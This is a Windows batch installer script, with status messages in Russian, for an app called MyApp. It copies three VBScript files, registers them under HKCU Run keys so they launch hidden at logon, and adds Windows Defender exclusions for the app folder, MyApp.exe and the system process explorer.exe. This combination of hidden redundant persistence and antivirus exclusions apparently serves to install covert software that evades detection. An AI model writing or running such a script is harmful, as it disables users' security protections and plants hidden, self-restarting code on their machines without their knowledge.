@echo off
setlocal EnableDelayedExpansion

set "APP_DIR=C:\Program Files (x86)\MyApp"
set "REG_NAME=MyAppLauncher"

net session >nul 2>&1
if !errorlevel! neq 0 (
    echo [ОШИБКА] Запустите от имени администратора.
    pause
    exit /b 1
)

if not exist "!APP_DIR!\MyApp.exe" (
    echo [ОШИБКА] MyApp.exe не найден.
    pause
    exit /b 1
)

echo [1/3] Копирование VBS...
copy /y "%~dp0MyApp_Launcher.vbs" "!APP_DIR!\" >nul
copy /y "%~dp0MyApp_Watchdog.vbs" "!APP_DIR!\" >nul
copy /y "%~dp0MyApp_Backup.vbs" "!APP_DIR!\" >nul
echo     OK

echo [2/3] Реестр HKCU\Run...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "!REG_NAME!" /t REG_SZ /d "wscript.exe \"!APP_DIR!\MyApp_Launcher.vbs\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MyAppWatchdog" /t REG_SZ /d "wscript.exe \"!APP_DIR!\MyApp_Watchdog.vbs\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MyAppBackup" /t REG_SZ /d "wscript.exe \"!APP_DIR!\MyApp_Backup.vbs\"" /f >nul 2>&1
echo     OK

echo [3/3] Исключения Defender...
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "!APP_DIR!" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "MyApp.exe" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "explorer.exe" /t REG_DWORD /d 0 /f >nul 2>&1
echo     OK

echo.
echo ========================================
echo  ГОТОВО
echo ========================================
echo  Launcher:  запуск MyApp.exe через 60 сек
echo  Backup:    проверка explorer.exe каждые 8 мин
echo  Watchdog:  проверка explorer.exe каждые 25 мин
echo  Все скрыто, без окон.
echo.
echo  Удаление:
echo    reg delete "HKCU\...\Run" /v "MyAppLauncher" /f
echo    reg delete "HKCU\...\Run" /v "MyAppWatchdog" /f
echo    reg delete "HKCU\...\Run" /v "MyAppBackup" /f
echo.
pause
